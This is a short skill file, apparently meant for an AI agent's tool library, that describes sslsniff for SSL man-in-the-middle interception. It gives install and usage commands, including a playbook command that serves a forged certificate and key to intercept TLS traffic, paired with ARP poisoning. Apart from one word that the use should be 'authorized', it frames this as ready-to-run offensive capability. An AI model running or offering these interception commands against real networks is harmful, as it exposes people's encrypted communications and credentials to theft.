---
name: sslsniff-cert-mitm
description: "sslsniff performs SSL MITM. Signals: MITM, mitm, SSL MITM, specify certificate"
zh-signals: "sslsniff: SSL 中间人。信号:中间人,mitm,SSL MITM,指定证书。"
when-to-use: "Use when performing an authorized SSL MITM with a specified forged certificate to intercept TLS traffic."
---

# sslsniff

- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
- Upstream Repository: https://github.com/moxie0/sslsniff
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
apt install sslsniff
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `sslsniff -a -w /tmp/log -p 443` | SSL MITM |
| `-c cert.pem -k key.pem` | Specify certificate |

## Attack Scenario Playbook

### SSL Man-in-the-Middle

```bash
sslsniff -a -c fake.pem -k fake.key -w certs/
# pair it with ARP poisoning
```

## Notes

SSL MITM tool by Moxie Marlinspike.
